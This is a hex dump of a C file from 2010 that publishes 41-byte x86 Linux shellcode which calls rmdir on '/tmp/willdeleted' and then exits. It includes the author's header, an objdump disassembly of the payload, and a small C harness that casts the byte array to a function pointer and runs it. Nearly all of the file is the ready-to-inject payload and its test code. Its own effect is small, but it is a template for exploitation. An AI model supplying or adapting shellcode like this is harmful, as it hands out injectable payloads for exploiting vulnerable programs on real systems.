00000000  2f 2a 0d 0a 4e 61 6d 65  20 20 20 3a 20 34 31 20  |/*..Name   : 41 |
00000010  62 79 74 65 73 20 73 79  73 5f 72 6d 64 69 72 28  |bytes sys_rmdir(|
00000020  22 2f 74 6d 70 2f 77 69  6c 6c 64 65 6c 65 74 65  |"/tmp/willdelete|
00000030  64 22 29 20 78 38 36 20  6c 69 6e 75 78 20 73 68  |d") x86 linux sh|
00000040  65 6c 6c 63 6f 64 65 0d  0a 44 61 74 65 20 20 20  |ellcode..Date   |
00000050  3a 20 6d 61 79 2c 20 33  31 20 32 30 31 30 0d 0a  |: may, 31 2010..|
00000060  41 75 74 68 6f 72 20 3a  20 67 75 6e 73 6c 69 6e  |Author : gunslin|
00000070  67 65 72 5f 0d 0a 57 65  62 20 20 20 20 3a 20 64  |ger_..Web    : d|
00000080  65 76 69 6c 7a 63 30 64  65 2e 63 6f 6d 0d 0a 62  |evilzc0de.com..b|
00000090  6c 6f 67 20 20 20 3a 20  67 75 6e 73 6c 69 6e 67  |log   : gunsling|
000000a0  65 72 63 30 64 65 2e 77  6f 72 64 70 72 65 73 73  |erc0de.wordpress|
000000b0  2e 63 6f 6d 0d 0a 74 65  73 74 65 64 20 6f 6e 20  |.com..tested on |
000000c0  3a 20 6c 69 6e 75 78 20  64 65 62 69 61 6e 0d 0a  |: linux debian..|
000000d0  0d 0a 0d 0a 72 6f 6f 74  40 6c 6f 63 61 6c 68 6f  |....root@localho|
000000e0  73 74 3a 2f 68 6f 6d 65  2f 67 75 6e 73 6c 69 6e  |st:/home/gunslin|
000000f0  67 65 72 2f 73 68 65 6c  6c 63 6f 64 65 23 20 6f  |ger/shellcode# o|
00000100  62 6a 64 75 6d 70 20 2d  64 20 72 6d 64 69 72 0d  |bjdump -d rmdir.|
00000110  0a 0d 0a 72 6d 64 69 72  3a 20 20 20 20 20 66 69  |...rmdir:     fi|
00000120  6c 65 20 66 6f 72 6d 61  74 20 65 6c 66 33 32 2d  |le format elf32-|
00000130  69 33 38 36 0d 0a 0d 0a  44 69 73 61 73 73 65 6d  |i386....Disassem|
00000140  62 6c 79 20 6f 66 20 73  65 63 74 69 6f 6e 20 2e  |bly of section .|
00000150  74 65 78 74 3a 0d 0a 0d  0a 30 38 30 34 38 30 36  |text:....0804806|
00000160  30 20 3c 2e 74 65 78 74  3e 3a 0d 0a 20 38 30 34  |0 <.text>:.. 804|
00000170  38 30 36 30 3a 09 65 62  20 31 31 20 20 20 20 20  |8060:.eb 11     |
00000180  20 20 20 20 20 20 20 20  20 20 20 09 6a 6d 70 20  |           .jmp |
00000190  20 20 20 30 78 38 30 34  38 30 37 33 0d 0a 20 38  |   0x8048073.. 8|
000001a0  30 34 38 30 36 32 3a 09  33 31 20 63 30 20 20 20  |048062:.31 c0   |
000001b0  20 20 20 20 20 20 20 20  20 20 20 20 20 09 78 6f  |             .xo|
000001c0  72 20 20 20 20 25 65 61  78 2c 25 65 61 78 0d 0a  |r    %eax,%eax..|
000001d0  20 38 30 34 38 30 36 34  3a 09 62 30 20 32 38 20  | 8048064:.b0 28 |
000001e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
000001f0  6d 6f 76 20 20 20 20 24  30 78 32 38 2c 25 61 6c  |mov    $0x28,%al|
00000200  0d 0a 20 38 30 34 38 30  36 36 3a 09 33 31 20 64  |.. 8048066:.31 d|
00000210  62 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |b               |
00000220  20 09 78 6f 72 20 20 20  20 25 65 62 78 2c 25 65  | .xor    %ebx,%e|
00000230  62 78 0d 0a 20 38 30 34  38 30 36 38 3a 09 35 62  |bx.. 8048068:.5b|
00000240  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000250  20 20 20 09 70 6f 70 20  20 20 20 25 65 62 78 0d  |   .pop    %ebx.|
00000260  0a 20 38 30 34 38 30 36  39 3a 09 63 64 20 38 30  |. 8048069:.cd 80|
00000270  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000280  09 69 6e 74 20 20 20 20  24 30 78 38 30 0d 0a 20  |.int    $0x80.. |
00000290  38 30 34 38 30 36 62 3a  09 33 31 20 63 30 20 20  |804806b:.31 c0  |
000002a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 09 78  |              .x|
000002b0  6f 72 20 20 20 20 25 65  61 78 2c 25 65 61 78 0d  |or    %eax,%eax.|
000002c0  0a 20 38 30 34 38 30 36  64 3a 09 62 30 20 30 31  |. 804806d:.b0 01|
000002d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002e0  09 6d 6f 76 20 20 20 20  24 30 78 31 2c 25 61 6c  |.mov    $0x1,%al|
000002f0  0d 0a 20 38 30 34 38 30  36 66 3a 09 33 31 20 64  |.. 804806f:.31 d|
00000300  62 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |b               |
00000310  20 09 78 6f 72 20 20 20  20 25 65 62 78 2c 25 65  | .xor    %ebx,%e|
00000320  62 78 0d 0a 20 38 30 34  38 30 37 31 3a 09 63 64  |bx.. 8048071:.cd|
00000330  20 38 30 20 20 20 20 20  20 20 20 20 20 20 20 20  | 80             |
00000340  20 20 20 09 69 6e 74 20  20 20 20 24 30 78 38 30  |   .int    $0x80|
00000350  0d 0a 20 38 30 34 38 30  37 33 3a 09 65 38 20 65  |.. 8048073:.e8 e|
00000360  61 20 66 66 20 66 66 20  66 66 20 20 20 20 20 20  |a ff ff ff      |
00000370  20 09 63 61 6c 6c 20 20  20 30 78 38 30 34 38 30  | .call   0x80480|
00000380  36 32 0d 0a 20 38 30 34  38 30 37 38 3a 09 32 66  |62.. 8048078:.2f|
00000390  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003a0  20 20 20 09 64 61 73 20  20 20 20 0d 0a 20 38 30  |   .das    .. 80|
000003b0  34 38 30 37 39 3a 09 37  34 20 36 64 20 20 20 20  |48079:.74 6d    |
000003c0  20 20 20 20 20 20 20 20  20 20 20 20 09 6a 65 20  |            .je |
000003d0  20 20 20 20 30 78 38 30  34 38 30 65 38 0d 0a 20  |    0x80480e8.. |
000003e0  38 30 34 38 30 37 62 3a  09 37 30 20 32 66 20 20  |804807b:.70 2f  |
000003f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 09 6a  |              .j|
00000400  6f 20 20 20 20 20 30 78  38 30 34 38 30 61 63 0d  |o     0x80480ac.|
00000410  0a 20 38 30 34 38 30 37  64 3a 09 37 37 20 36 39  |. 804807d:.77 69|
00000420  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000430  09 6a 61 20 20 20 20 20  30 78 38 30 34 38 30 65  |.ja     0x80480e|
00000440  38 0d 0a 20 38 30 34 38  30 37 66 3a 09 36 63 20  |8.. 804807f:.6c |
00000450  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000460  20 20 09 69 6e 73 62 20  20 20 28 25 64 78 29 2c  |  .insb   (%dx),|
00000470  25 65 73 3a 28 25 65 64  69 29 0d 0a 20 38 30 34  |%es:(%edi).. 804|
00000480  38 30 38 30 3a 09 36 63  20 20 20 20 20 20 20 20  |8080:.6c        |
00000490  20 20 20 20 20 20 20 20  20 20 20 09 69 6e 73 62  |           .insb|
000004a0  20 20 20 28 25 64 78 29  2c 25 65 73 3a 28 25 65  |   (%dx),%es:(%e|
000004b0  64 69 29 0d 0a 20 38 30  34 38 30 38 31 3a 09 36  |di).. 8048081:.6|
000004c0  34 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |4               |
000004d0  20 20 20 20 09 66 73 0d  0a 20 38 30 34 38 30 38  |    .fs.. 804808|
000004e0  32 3a 09 36 35 20 20 20  20 20 20 20 20 20 20 20  |2:.65           |
000004f0  20 20 20 20 20 20 20 20  09 67 73 0d 0a 20 38 30  |        .gs.. 80|
00000500  34 38 30 38 33 3a 09 36  63 20 20 20 20 20 20 20  |48083:.6c       |
00000510  20 20 20 20 20 20 20 20  20 20 20 20 09 69 6e 73  |            .ins|
00000520  62 20 20 20 28 25 64 78  29 2c 25 65 73 3a 28 25  |b   (%dx),%es:(%|
00000530  65 64 69 29 0d 0a 20 38  30 34 38 30 38 34 3a 09  |edi).. 8048084:.|
00000540  36 35 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |65              |
00000550  20 20 20 20 20 09 67 73  0d 0a 20 38 30 34 38 30  |     .gs.. 80480|
00000560  38 35 3a 09 37 34 20 36  35 20 20 20 20 20 20 20  |85:.74 65       |
00000570  20 20 20 20 20 20 20 20  20 09 6a 65 20 20 20 20  |         .je    |
00000580  20 30 78 38 30 34 38 30  65 63 0d 0a 20 38 30 34  | 0x80480ec.. 804|
00000590  38 30 38 37 3a 09 36 34  20 20 20 20 20 20 20 20  |8087:.64        |
000005a0  20 20 20 20 20 20 20 20  20 20 20 09 66 73 0d 0a  |           .fs..|
000005b0  72 6f 6f 74 40 6c 6f 63  61 6c 68 6f 73 74 3a 2f  |root@localhost:/|
000005c0  68 6f 6d 65 2f 67 75 6e  73 6c 69 6e 67 65 72 2f  |home/gunslinger/|
000005d0  73 68 65 6c 6c 63 6f 64  65 23 0d 0a 2a 2f 0d 0a  |shellcode#..*/..|
000005e0  0d 0a 23 69 6e 63 6c 75  64 65 20 3c 73 74 64 69  |..#include <stdi|
000005f0  6f 2e 68 3e 0d 0a 0d 0a  63 68 61 72 20 70 75 73  |o.h>....char pus|
00000600  73 79 5b 5d 20 3d 20 20  22 5c 78 65 62 5c 78 31  |sy[] =  "\xeb\x1|
00000610  31 5c 78 33 31 5c 78 63  30 5c 78 62 30 5c 78 32  |1\x31\xc0\xb0\x2|
00000620  38 5c 78 33 31 22 0d 0a  09 09 22 5c 78 64 62 5c  |8\x31"...."\xdb\|
00000630  78 35 62 5c 78 63 64 5c  78 38 30 5c 78 33 31 5c  |x5b\xcd\x80\x31\|
00000640  78 63 30 5c 78 62 30 22  0d 0a 09 09 22 5c 78 30  |xc0\xb0"...."\x0|
00000650  31 5c 78 33 31 5c 78 64  62 5c 78 63 64 5c 78 38  |1\x31\xdb\xcd\x8|
00000660  30 5c 78 65 38 5c 78 65  61 22 0d 0a 09 09 22 5c  |0\xe8\xea"...."\|
00000670  78 66 66 5c 78 66 66 5c  78 66 66 5c 78 32 66 5c  |xff\xff\xff\x2f\|
00000680  78 37 34 5c 78 36 64 5c  78 37 30 22 0d 0a 09 09  |x74\x6d\x70"....|
00000690  22 5c 78 32 66 5c 78 37  37 5c 78 36 39 5c 78 36  |"\x2f\x77\x69\x6|
000006a0  63 5c 78 36 63 5c 78 36  34 5c 78 36 35 22 0d 0a  |c\x6c\x64\x65"..|
000006b0  09 09 22 5c 78 36 63 5c  78 37 34 5c 78 36 35 5c  |.."\x6c\x74\x65\|
000006c0  78 37 34 5c 78 36 35 5c  78 36 34 22 3b 0d 0a 0d  |x74\x65\x64";...|
000006d0  0a 69 6e 74 20 6d 61 69  6e 28 76 6f 69 64 29 0d  |.int main(void).|
000006e0  0a 7b 0d 0a 09 28 2a 28  76 6f 69 64 28 2a 29 28  |.{...(*(void(*)(|
000006f0  29 29 20 70 75 73 73 79  29 28 29 3b 0d 0a 20 20  |)) pussy)();..  |
00000700  20 20 20 0d 0a 72 65 74  75 72 6e 20 30 3b 0d 0a  |   ..return 0;..|
00000710  7d                                                |}|
00000711
